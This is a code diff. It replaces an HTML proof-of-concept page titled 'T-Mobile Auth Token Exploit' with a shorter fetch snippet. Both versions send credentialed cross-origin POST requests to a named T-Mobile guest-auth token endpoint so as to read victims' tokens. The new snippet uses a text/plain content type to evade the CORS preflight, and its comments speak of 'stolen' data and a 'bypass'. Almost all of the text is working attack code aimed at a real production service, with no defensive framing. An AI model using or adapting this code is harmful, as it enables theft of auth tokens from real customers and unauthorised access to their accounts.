@@ -1,37 +1,21 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <h1>T-Mobile Auth Token Exploit</h1>
-    <div id="status">Testing for Token Leak...</div>
-    <pre id="output" style="border: 1px solid black; padding: 10px;"></pre>
-
-    <script>
-        // Targeting the ADN Guest Auth endpoint
-        const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens';
-
-        fetch(target, {
-            method: 'POST', // Most token endpoints require POST
-            mode: 'cors',
-            credentials: 'include', // Sends victim cookies
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({}) // Sending an empty body to trigger a response
-        })
-        .then(response => {
-            // Check if they reflected your Origin
-            const acao = response.headers.get('Access-Control-Allow-Origin');
-            console.log("Allowed Origin:", acao);
-            return response.json();
-        })
-        .then(data => {
-            document.getElementById('status').innerHTML = "<b style='color:green;'>SUCCESS: TOKEN DATA EXFILTRATED</b>";
-            document.getElementById('output').innerText = JSON.stringify(data, null, 2);
-        })
-        .catch(err => {
-            document.getElementById('status').innerHTML = "<b style='color:red;'>FAILED: Browser Blocked Request</b>";
-            document.getElementById('output').innerText = err;
-        });
-    </script>
-</body>
-</html>
+// We use text/plain to avoid the OPTIONS preflight bouncer
+fetch('https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens', {
+    method: 'POST',
+    mode: 'cors',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'text/plain' // This is the secret to bypassing the OPTIONS failure
+    },
+    body: '{}' 
+})
+.then(response => {
+    // If this works, we will see the stolen data even if the OPTIONS failed before
+    console.log("Stolen Headers:", response.headers.get('Access-Control-Allow-Origin'));
+    return response.json();
+})
+.then(data => {
+    document.getElementById('output').innerText = JSON.stringify(data, null, 2);
+})
+.catch(err => {
+    document.getElementById('output').innerText = "Bypass Failed: " + err;
+});
